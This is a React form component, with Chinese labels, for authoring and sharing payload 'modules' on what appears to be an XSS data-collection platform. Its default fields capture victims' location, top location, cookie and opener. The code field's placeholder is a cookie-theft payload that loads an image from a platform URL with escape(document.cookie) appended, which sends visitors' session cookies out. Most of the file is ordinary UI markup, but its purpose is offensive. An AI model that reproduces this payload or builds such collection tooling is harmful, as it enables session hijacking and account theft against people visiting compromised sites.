import { useState } from 'react'
import { Button } from '@/components/ui/button'
import { Card, CardContent } from '@/components/ui/card'
import { Badge } from '@/components/ui/badge'
import { Switch } from '@/components/ui/switch'
import { DynamicKeyEditor } from '@/components/dynamic-key-editor'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Textarea } from '@/components/ui/textarea'

export interface ModuleFormValue {
  title: string
  description: string
  keys: string[]
  setkeys: string[]
  code: string
  isOpen: boolean
}

export const DEFAULT_KEYS = ['location', 'toplocation', 'cookie', 'opener']

export function ModuleForm({
  initial,
  submitLabel,
  readOnly = false,
  pending = false,
  error,
  onSubmit,
}: {
  initial: ModuleFormValue
  submitLabel: string
  readOnly?: boolean
  pending?: boolean
  error?: string
  onSubmit: (value: ModuleFormValue) => void
}) {
  const [value, setValue] = useState<ModuleFormValue>(initial)

  function update<K extends keyof ModuleFormValue>(key: K, next: ModuleFormValue[K]) {
    setValue((prev) => ({ ...prev, [key]: next }))
  }

  return (
    <Card className="max-w-4xl">
      <CardContent className="flex flex-col gap-6">
        <section className="flex flex-col gap-4">
          <h3 className="text-[11px] font-semibold tracking-[0.08em] text-muted-foreground uppercase">
            基本信息
          </h3>
          <div className="grid gap-4 md:grid-cols-2">
            <div className="flex flex-col gap-2">
              <Label htmlFor="module-title">模块名称</Label>
              <Input
                id="module-title"
                className="h-10"
                value={value.title}
                readOnly={readOnly}
                onChange={(event) => update('title', event.target.value)}
                placeholder="例如：通用收包"
              />
            </div>
            <div className="flex flex-col gap-2">
              <Label htmlFor="module-description">模块描述</Label>
              <Input
                id="module-description"
                className="h-10"
                value={value.description}
                readOnly={readOnly}
                onChange={(event) => update('description', event.target.value)}
                placeholder="一句话说明这个模块做什么"
              />
            </div>
          </div>
        </section>

        <section className="flex flex-col gap-4 border-t border-border/60 pt-5">
          <div className="flex flex-col gap-0.5">
            <h3 className="text-[11px] font-semibold tracking-[0.08em] text-muted-foreground uppercase">
              参数
            </h3>
            <p className="text-xs text-muted-foreground">
              参数决定收包时保存哪些字段，配置参数会在生成代码时替换 {'{set.***}'}。
            </p>
          </div>
          {readOnly ? (
            <div className="flex flex-wrap gap-2 text-sm">
              <Badge variant="outline" className="font-mono">
                {value.keys.join(', ') || '无参数'}
              </Badge>
              {value.setkeys.length > 0 && (
                <Badge variant="outline" className="font-mono">
                  {value.setkeys.join(', ')}
                </Badge>
              )}
            </div>
          ) : (
            <div className="grid gap-4 md:grid-cols-2">
              <DynamicKeyEditor
                label="接收参数"
                value={value.keys}
                onChange={(next) => update('keys', next)}
              />
              <DynamicKeyEditor
                label="配置参数"
                value={value.setkeys}
                onChange={(next) => update('setkeys', next)}
              />
            </div>
          )}
        </section>

        <section className="flex flex-col gap-3 border-t border-border/60 pt-5">
          <div className="flex items-center justify-between gap-2">
            <h3 className="text-[11px] font-semibold tracking-[0.08em] text-muted-foreground uppercase">
              代码
            </h3>
            <span className="font-mono text-[11px] text-muted-foreground">
              {'{projectId}'} · {'{set.***}'}
            </span>
          </div>
          <Textarea
            id="module-code"
            aria-label="代码"
            className="min-h-56 bg-muted/20 font-mono text-xs leading-relaxed"
            value={value.code}
            readOnly={readOnly}
            onChange={(event) => update('code', event.target.value)}
            placeholder="(new Image()).src='https://your-platform/index.php?do=api&id={projectId}&cookie='+escape(document.cookie)"
          />
          <p className="text-xs text-muted-foreground">
            {'{projectId}'} 会替换为项目收包标识，{'set.***'} 会替换为上面配置参数的值。
          </p>
        </section>

        <section className="border-t border-border/60 pt-5">
          <div className="flex items-center justify-between gap-4 rounded-xl border border-border/70 bg-muted/20 px-4 py-3">
            <div className="flex flex-col gap-0.5">
              <Label htmlFor="module-open">公开到模块库</Label>
              <span className="text-xs text-muted-foreground">
                公开后需要管理员审核，通过后所有用户都可以使用
              </span>
            </div>
            {readOnly ? (
              <Badge variant={value.isOpen ? 'secondary' : 'outline'}>
                {value.isOpen ? '公开' : '私有'}
              </Badge>
            ) : (
              <Switch id="module-open" checked={value.isOpen} onCheckedChange={(next) => update('isOpen', next)} />
            )}
          </div>
        </section>

        {error && <p className="text-sm text-destructive">{error}</p>}
        {!readOnly && (
          <div className="flex items-center gap-2 border-t border-border/70 pt-4">
            <Button onClick={() => onSubmit(value)} disabled={pending}>
              {submitLabel}
            </Button>
            <Button variant="outline" onClick={() => history.go(-1)}>
              取消
            </Button>
          </div>
        )}
      </CardContent>
    </Card>
  )
}
